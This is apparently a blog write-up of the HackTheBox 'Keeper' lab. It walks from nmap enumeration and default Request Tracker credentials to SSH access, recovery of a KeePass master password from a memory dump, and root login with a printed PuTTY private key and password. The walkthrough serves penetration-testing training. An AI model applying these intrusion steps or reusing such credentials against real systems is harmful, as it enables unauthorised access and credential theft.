---
title: HTB - Keeper
date: 2024-07-09T15:40:00
categories:
  - Posts
  - HackTheBox
tags:
  - HackTheBox
  - KeePass
  - OpenSSH
  - RequestTracker
---
![Keeper.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Keeper.png)
## Summary
Use default credentials to access ticketing system <br/>
Find cleartext password for initial SSH access <br/>
Leverage KeePass vulnerability to retrieve SSH key for root
## Enumeration
#### Port Scanning
We'll start off by running nmap and exporting the results in all formats. 
```
$ nmap -sV -sC -T4 10.10.11.227 -oA nmap       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 13:55 EDT
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It appears there's only two TCP ports open, 22 (ssh) and 80 (http). Nmap reveals the domain keeper.htb so we'll add that to our hosts file. 

#### Port 80
Upon visiting http://keeper.htb we are met with a link to raise an IT support ticket.
![Pasted image 20240709140705 1.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240709140705%201.png)

After following the link, we're met with a login page with some interesting details about the tech stack. My first instinct is to find documentation on the application and look for default credentials, followed by searching the web for any CVEs that may apply to version 4.4.4.
![Pasted image 20240709140755.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240709140755.png)

As luck would have it, the default credentials for Request Tracker authenticate us as the root user. After some poking around, we find a listing of other users among which we find lnorgaard (Lise Nørgaard.) Lise is a new user with their initial password stored in plaintext. 
![Pasted image 20240709141101.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240709141101.png)

#### SSH
Let's take those credentials and attempt an SSH connection. 
```
$ ssh lnorgaard@10.10.11.227            
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ whoami
lnorgaard
```
Perfect! We got user access!
## Privilege Escalation
In Lise's home folder, we find the user flag and a zip archive.
```
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```
Let's download the archive and extract it on our host.
```
$ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx 
```
So we have a dump file and running the file command on passcodes.kdbx reveals a KeePass database version 2.x. We can use 'kpcli' to interact with the database but it is password protected. Fortunately for us, this version happens to have a vulnerability that allows us to reveal the master password. Running the tool https://github.com/vdohney/keepass-password-dumper we get the following:
![Pasted image 20240709151105.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240709151105.png)
Googling the last two words we can reveal the first two characters as part of a popular Danish dessert. Now we can open the database and look for credentials that may help us pivot or escalate our credentials.
```
$ kpcli

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> open passcodes.kdbx 
Provide the master password: 
```
We can then use the built-in find command to look for results related to our domain.
```
kpcli:/> find keeper
Searching for "keeper" https://raw.githubusercontent.com/sullydan/sullydan.github.io/main.
 - 1 matches found and placed into /_found/
Would you like to show this entry? [y/N] 
=== Entries ===
0. keeper.htb (Ticketing Server)                                          

 Path: /passcodes/Network/
Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
Since I'm on a Kali host, we can convert this putty key to one we can use with openSSH. We'll save the original as ssh-rsa and using the following command, output our private key as keeper_id_rsa.
```
$ puttygen ssh-rsa -o keeper_id_rsa -O private-openssh
```
Now to use our newfound key to SSH into the server. Note: the root username was specified in the database entry we found.
```
$ ssh -i keeper_id_rsa root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# whoami
root

```
That's it, we officially have root!